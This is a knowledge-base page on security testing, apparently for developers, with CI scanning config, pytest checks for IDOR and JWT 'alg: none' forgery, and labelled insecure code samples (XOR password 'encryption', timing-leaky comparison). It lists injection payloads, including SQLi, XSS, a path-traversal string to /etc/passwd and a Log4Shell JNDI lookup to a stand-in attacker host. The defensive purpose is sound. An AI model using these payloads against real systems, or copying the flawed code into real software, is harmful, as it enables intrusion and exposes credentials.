---
title: Security Testing
layer: testing
type: concept
priority: high
version: 2.0.0
tags:
  - Testing
  - Security
  - Fuzzing
  - VulnerabilityAssessment
  - AppSec
description: Systematic testing to identify vulnerabilities, verify security controls, and ensure the system resists adversarial manipulation across the full attack surface.
---

# Security Testing

## Description

Security testing is the practice of probing a system to discover vulnerabilities that an attacker could exploit to compromise confidentiality, integrity, or availability (the CIA triad). It encompasses multiple techniques: manual code review focused on security, automated static analysis (SAST), dynamic application security testing (DAST), dependency scanning (SCA), fuzzing, penetration testing, and threat modeling. Unlike functional testing, which verifies that the system does what it should, security testing verifies that the system does **not** do what it should not — that unauthorized access, data leakage, privilege escalation, and denial of service are all prevented.

Security testing is adversarial by nature: the tester thinks like an attacker, not a user. This requires a different mindset than functional testing and often different tools, techniques, and expertise.

## Purpose

**When to use:**

- **Before every production release** — security regression testing should be part of the CI/CD gate, just like unit tests. Run SAST, dependency scanning, and DAST on every build.
- **When handling untrusted input** — any endpoint that accepts user input (HTTP APIs, file uploads, WebSocket messages, GraphQL mutations, CLI arguments) must be tested for injection attacks (SQLi, XSS, command injection, path traversal, LDAP injection, XPath injection).
- **After introducing new dependencies** — every `npm install`, `pip install`, or `cargo add` introduces transitive risk. Run SCA (Software Composition Analysis) to check for known CVEs.
- **When implementing authentication or authorization** — test for broken access control (IDOR, privilege escalation, horizontal/vertical privilege escalation, session fixation, JWT manipulation).
- **Before compliance audits** — SOC 2, ISO 27001, PCI DSS, HIPAA all require documented security testing. Start testing early; remediation takes longer than expected.
- **After architectural changes** — new service boundaries, API gateways, or message queues change the attack surface. Re-evaluate the threat model and test the new surface.
- **When handling sensitive data** — PII, PHI, payment data, credentials, encryption keys. Test data-at-rest encryption, data-in-transit encryption, access controls, and audit logging.
- **Before open-sourcing internal code** — scan for leaked secrets (API keys, tokens, internal URLs, hardcoded passwords) using tools like `git-secrets`, `trufflehog`, or `gitleaks`.

**When to avoid:**

- **On prototypes or proof-of-concepts that will be discarded** — the investment in security testing is not justified if the code will not reach production. However, document the debt so it is addressed before productionization.
- **On air-gapped systems with no external input** — if the system truly has no network connectivity, no user input, and no dependency on external data, the attack surface is near-zero. (Note: truly air-gapped systems are rare; verify before skipping.)
- **When the test is a checkbox exercise without remediation capacity** — running a scanner and ignoring its results is worse than not running it, because it creates false confidence. Only test if the team will act on findings.
- **During active incident response** — while a breach is ongoing, focus on containment and recovery, not testing. Perform post-incident security testing after the system is stabilized.

## Tradeoffs

| Dimension | Automated scanning (SAST/DAST/SCA) | Manual penetration testing |
|---|---|---|
| Cost per run | Near-zero (CI integration) | $10k-$100k+ per engagement |
| Coverage breadth | High — scans all reachable endpoints | Limited by time and tester expertise |
| Coverage depth | Shallow — known patterns only | Deep — creative attack chains, business logic abuse |
| False positive rate | 20-50% (requires tuning) | Near-zero (findings are validated exploits) |
| Frequency | Every commit | Quarterly or per major release |
| Detects business-logic flaws | No | Yes |
| Requires source access | SAST: yes, DAST: no, SCA: no | No |

**Alternatives:**

- **Threat modeling** — proactive, design-time analysis of potential attack vectors (STRIDE, DREAD). Cheaper and earlier than testing, but speculative — must be validated with actual tests. Use threat modeling to guide where to focus security testing.
- **Bug bounty programs** — pay external researchers to find vulnerabilities in production. Broader than any single penetration test, but uncontrolled — researchers may test at inconvenient times, and findings are not guaranteed. Use as a complement to scheduled testing, not a replacement.
- **Formal verification** — mathematically proves that code satisfies security properties (no unauthorized access, no information leakage). Used in seL4 microkernel, AWS ENA driver. Prohibitively expensive for most applications but provides the strongest guarantee.
- **Runtime application self-protection (RASP)** — embed security controls in the application that detect and block attacks at runtime (e.g., SQL injection detection and blocking). Catches attacks that testing missed, but adds runtime overhead and may have its own vulnerabilities.
- **Red teaming** — full-scope adversarial simulation including social engineering, physical access, and infrastructure attacks. Broader than application security testing. Use annually or after major infrastructure changes.

## Rules

1. **Shift left, but don't stop shifting.** Run SAST and SCA in pre-commit hooks, DAST in CI, and penetration tests before release. Every layer catches different classes of bugs. Pre-commit catches secrets and obvious injections; DAST catches runtime misconfigurations; pen tests catch business-logic flaws.

2. **Test with authenticated and unauthenticated perspectives.** Many vulnerabilities are only exploitable with some level of access (e.g., horizontal privilege escalation). Test both: what can an anonymous user do, and what can a low-privilege user do that they should not?

3. **Always test the authorization layer independently of the UI.** The UI may hide buttons, but the API endpoint may still be accessible. Test every API endpoint with tokens from different roles to verify access controls. A common pattern:

```bash
# Test: can a regular user access admin endpoints?
curl -H "Authorization: Bearer $USER_TOKEN" \
     https://api.example.com/admin/users
# Expected: 403 Forbidden
# If 200 OK: broken access control (CWE-285)
```

4. **Test for injection in every input vector, not just HTML forms.** JSON bodies, HTTP headers, cookies, URL parameters, file uploads, WebSocket messages, gRPC metadata, and environment variables are all injection surfaces. Test each with payloads like `' OR 1=1 --`, `<script>alert(1)</script>`, `../../../etc/passwd`, and `${jndi:ldap://attacker.com/a}`.

5. **Verify secrets management.** Hardcoded credentials in source code are the most common critical finding. Use `gitleaks` or `trufflehog` in CI to scan for secrets. In production, verify that secrets are injected via environment variables or secret managers (AWS Secrets Manager, HashiCorp Vault), never checked into version control.

6. **Test cryptographic implementations for common mistakes:**
   - Using MD5 or SHA-1 for security purposes (use SHA-256+)
   - Rolling own cryptography instead of using established libraries (use `libsodium`, `cryptography`, or platform-standard libraries)
   - ECB mode for block ciphers (use CBC or GCM)
   - Predictable IVs or nonces
   - Storing passwords with reversible encryption (use bcrypt, argon2, or scrypt)
   - Not verifying HMAC before decrypting (use encrypt-then-MAC or AEAD)

7. **Dependency scanning is not optional.** Every dependency is code you did not write but must trust. Automate SCA with Dependabot, Renovate, Snyk, or Trivy. Block merges that introduce known CVEs with severity >= High. Pin dependency versions and lock files in version control.

## Examples

### Example 1: SAST integration in CI (GitHub Actions)

```yaml
# .github/workflows/security.yml
name: Security Testing

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
  schedule:
    - cron: '0 6 * * 1'  # Weekly deep scan

jobs:
  sast:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run Semgrep
        uses: returntocorp/semgrep-action@v1
        with:
          config: >-
            p/default
            p/owasp-top-ten
            p/cwe-top-25
        env:
          SEMGREP_APP_TOKEN: ${{ secrets.SEMGREP_APP_TOKEN }}

  sca:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Dependency review
        uses: actions/dependency-review-action@v3
        with:
          fail-on-severity: high

  secrets:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Run gitleaks
        uses: gitleaks/gitleaks-action@v2
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

This pipeline runs three security checks on every PR: SAST (Semgrep with OWASP and CWE rule sets), SCA (dependency review blocking on high-severity CVEs), and secret scanning (gitleaks checking full git history). The weekly cron job runs a deeper scan that may be too slow for every PR.

### Example 2: DAST test — testing for IDOR (Insecure Direct Object Reference)

```python
import requests
import pytest

BASE_URL = "https://api.example.com"

def test_idor_user_cannot_access_another_users_data():
    """User A should not be able to read User B's order details."""
    # Authenticate as User A
    resp_a = requests.post(f"{BASE_URL}/auth/login", json={
        "email": "user_a@example.com",
        "password": "password_a",
    })
    token_a = resp_a.json()["access_token"]

    # User A requests their own order — should succeed
    resp_own = requests.get(
        f"{BASE_URL}/api/orders/1001",
        headers={"Authorization": f"Bearer {token_a}"},
    )
    assert resp_own.status_code == 200
    assert resp_own.json()["user_id"] == "user_a_id"

    # User A tries to access User B's order (ID 1002)
    resp_other = requests.get(
        f"{BASE_URL}/api/orders/1002",
        headers={"Authorization": f"Bearer {token_a}"},
    )
    # This should be 403, not 200
    assert resp_other.status_code == 403, (
        f"IDOR vulnerability: User A accessed User B's order. "
        f"Response: {resp_other.json()}"
    )
```

This test catches one of the most common and impactful web application vulnerabilities. OWASP ranks Broken Access Control as the #1 risk in the 2021 Top 10.

### Example 3: Testing JWT manipulation vulnerability

```python
import jwt
import requests
import hmac
import base64

def test_jwt_alg_none_attack():
    """
    The 'alg: none' attack: an attacker creates a JWT with
    algorithm set to 'none', which some libraries accept as
    'no signature required.'
    """
    # Create a forged token with alg=none
    header = base64.urlsafe_b64encode(
        b'{"alg":"none","typ":"JWT"}'
    ).rstrip(b"=").decode()
    payload = base64.urlsafe_b64encode(
        b'{"sub":"admin","role":"admin","iat":1700000000}'
    ).rstrip(b"=").decode()
    forged_token = f"{header}.{payload}."

    resp = requests.get(
        f"{BASE_URL}/api/admin/settings",
        headers={"Authorization": f"Bearer {forged_token}"},
    )
    # The server MUST reject this. If it returns 200, it's vulnerable.
    assert resp.status_code in (401, 403), (
        f"JWT alg=none vulnerability: server accepted unsigned token. "
        f"Response: {resp.status_code} {resp.text}"
    )
```

### Bad Example: Security testing that only tests the UI

```python
# BAD: This "security test" only checks that the admin button is hidden.
# It does not test whether the API endpoint is protected.
def test_admin_button_hidden_from_regular_user():
    page = login_as_regular_user()
    assert not page.is_visible("button#admin-panel")
    # This passes, but the endpoint /api/admin/settings is still accessible via curl.
```

**Why it's bad:** Hiding a UI element is not access control. An attacker does not need the button — they can call the API directly with `curl`. This creates a false sense of security. Always test the API layer, not just the presentation layer.

### Bad Example: Rolling custom cryptography

```python
# BAD: Custom "encryption" that is trivially breakable
def encrypt_password(password):
    # XOR with a fixed key is NOT encryption
    key = 0xAB
    return "".join(chr(ord(c) ^ key) for c in password)

def check_password(stored, provided):
    # Timing-vulnerable comparison — leaks information via response time
    return encrypt_password(provided) == stored
```

**Why it's bad:** XOR with a fixed key is trivially reversible — the "encrypted" password is one line of code away from plaintext. Additionally, the string comparison is not constant-time, enabling timing attacks. Use `bcrypt` or `argon2` for password hashing, and `hmac.compare_digest()` for constant-time comparison.

## Failure Modes

1. **Scanner false positives consume all engineering time** — SAST tools report 500 "vulnerabilities," 470 of which are false positives from test code, generated code, or misconfigured rules. Root cause: running the scanner with default rules against the entire codebase including test files. Mitigation: exclude test directories from SAST; tune rulesets to your stack; triage and mark false positives so the scanner learns; run scanners on production branches only, not feature branches.

2. **DAST cannot reach all endpoints** — the DAST scanner only crawls pages linked from the homepage and misses API endpoints that require specific POST bodies or non-standard authentication. Root cause: DAST crawlers cannot discover endpoints that are not linked or that require complex request sequences. Mitigation: provide the DAST tool with an OpenAPI/Swagger spec; use authenticated scanning; supplement DAST with API-specific testing (as in Example 2 above).

3. **Dependency scanning alerts on transitive dependencies you cannot fix** — a CVE is found in a transitive dependency 4 levels deep (`your-app -> framework -> util -> crypto-lib` with a known vulnerability). The direct dependency has no patch. Root cause: transitive dependency management is opaque; the vulnerable library is a dependency of a dependency. Mitigation: use dependency pinning with overrides; file issues upstream; consider replacing the entire dependency chain if the CVE is critical; use `npm audit --production` to check only production dependencies.

4. **Penetration test findings are never remediated** — the pentest report sits in a PDF on a wiki, and the same findings reappear in the next year's report. Root cause: findings are not tracked in the engineering team's issue tracker, so they are invisible to the people who fix bugs. Mitigation: import every pentest finding into Jira/GitHub Issues as a security ticket with severity, assigned team, and SLA (Critical: 48h, High: 2 weeks, Medium: 1 sprint). Re-test fixes before closing.

5. **Security testing is bypassed via emergency override** — a production incident leads to someone disabling the security gate in CI to deploy faster, and the gate is never re-enabled. Root cause: no governance on CI configuration; emergency processes do not include security exceptions. Mitigation: protect CI configuration files with branch protection rules (require 2 approvals to modify `.github/workflows/security.yml`); audit CI gate status weekly.

6. **Secrets committed and "removed" with a follow-up commit** — a developer accidentally commits an API key, then removes it in the next commit. The secret is still in the git history and is scraped by automated bots that monitor public repositories. Root cause: `git rm` does not erase history. Mitigation: use `git filter-branch` or `BFG Repo-Cleaner` to purge the secret from all history; rotate the compromised secret immediately (it has been exposed, even if only for minutes); enforce pre-commit hooks that block secrets before they are committed.

7. **Testing production with real credentials exposes real data** — the DAST scanner runs against production and triggers rate limiting, or worse, the security tester reads real PII while testing. Root cause: no separate staging environment with realistic but synthetic data. Mitigation: maintain a staging environment that mirrors production architecture with anonymized or synthetic data; if production testing is unavoidable (to test production-specific configuration), use scoped read-only tokens and audit all access.

8. **Threat model is stale after architectural changes** — the team created an excellent threat model during initial design, then added a new microservice, a message queue, and a third-party API integration without updating it. Security testing focuses on the original attack surface and misses the new one. Root cause: threat modeling is treated as a one-time activity, not a living document. Mitigation: update the threat model as part of the design review for any architectural change; re-run security testing against new attack surfaces; schedule quarterly threat model reviews.

## Best Practices

- **Integrate security testing at every stage of the SDLC.** Threat model at design time. Run SAST and SCA in pre-commit and CI. Run DAST in staging. Penetration test before release. Monitor with RASP and anomaly detection in production. Each layer catches different bugs.
- **Treat security findings as production bugs.** A High-severity vulnerability is equivalent to a P0 production incident. Triage within 24 hours, fix within the SLA for the severity level. Do not allow security debt to accumulate.
- **Use a vulnerability management dashboard.** Track: open findings by severity, mean time to remediate, recurring finding types, and coverage metrics (what percentage of services have DAST enabled, what percentage are scanning dependencies). Data drives investment.
- **Automate secret scanning in pre-commit hooks.** Install `detect-secrets` or `gitleaks` as a pre-commit hook. Blocking a secret before it is committed is infinitely cheaper than rotating it after exposure.
- **Test authorization on every endpoint, not just the ones that "should" be protected.** The most common vulnerability is not "the admin endpoint is unprotected" but "the endpoint that was supposed to be internal was exposed." Audit every route.
- **Use parameterized queries exclusively for database access.** Never concatenate user input into SQL strings. Use prepared statements or an ORM that parameterizes by default. This eliminates SQL injection at the root.
- **Implement Content Security Policy (CSP) headers.** Even if XSS is present, a strict CSP (`script-src 'self'`) prevents the injected script from executing. CSP is defense-in-depth, not a replacement for input sanitization.
- **Encrypt data at rest and in transit.** Use TLS 1.2+ for all network communication. Encrypt databases, object storage, and backups. Use a key management service (AWS KMS, GCP KMS) for key rotation. Never implement custom encryption for data at rest.
- **Log security events for audit.** Log authentication failures, authorization denials, input validation rejections, and privilege changes. Ensure logs are tamper-proof (write-once storage, append-only) and monitored (alert on anomalous patterns).
- **Conduct security training for all engineers.** Security is not only the AppSec team's responsibility. Every engineer who writes code introduces or prevents vulnerabilities. Train on OWASP Top 10, secure coding practices, and threat modeling.

## Related Topics

- [[Testing MOC]] — Navigation hub for all testing methodologies
- [[Fuzzing]] — Automated testing with random/mutated inputs to find crashes and security vulnerabilities; a core security testing technique
- [[OWASPTop10]] — The authoritative guide to the most common web application security risks; use as a checklist for security testing
- [[SecureCoding]] — Writing code that resists attack; security testing validates secure coding practices
- [[CodeReview]] — Security-focused code review is the most cost-effective security testing activity
- [[ThreatModeling]] — Proactive identification of attack vectors; guides where to focus security testing
- [[InputValidation]] — The primary defense against injection attacks; security testing should verify input validation at every entry point
- [[CI/CD]] — Security testing must be automated in the pipeline; manual testing does not scale
- [[PreCommitHooks]] — Block secrets, detect obvious vulnerabilities, and enforce security standards before code is even committed
- [[Architecture/ApiGateway]] — The API gateway is a security boundary; test authentication, authorization, rate limiting, and input validation at this layer
- [[Architecture/RateLimiting]] — Rate limiting is a security control (prevents brute force, DoS); test that it works correctly
- [[Architecture/Resilience]] — Security and resilience overlap in protecting against adversarial attacks; test both together
- [[DevOps/IncidentManagement]] — Security findings that reach production become security incidents; the incident management process must handle them
- [[DevOps/Monitoring]] — Security monitoring in production detects attacks that testing missed; combine prevention with detection
- [[DevOps/Logging]] — Security audit logs are essential for forensic analysis after a breach; test that logging works correctly
- [[Security]] — Root-level security knowledge base
- [[Programming/Concurrency]] — Concurrent vulnerabilities (race conditions in authorization checks, TOCTOU) require security-aware testing
- [[Databases/SQL]] — SQL injection is the most common web vulnerability; parameterized queries are the primary defense
- [[Databases/Redis]] — Redis is often exposed without authentication; test that Redis is not publicly accessible and requires AUTH
- [[Design/Contracts]] — API contracts define the expected input; security testing validates that unexpected inputs are rejected
- [[AI Code Review]] — AI-assisted code review tools can detect common security patterns but must be supplemented with human review
- [[AIValidation]] — AI-generated code frequently contains security vulnerabilities (hardcoded secrets, unsafe eval, improper error handling); security testing is essential
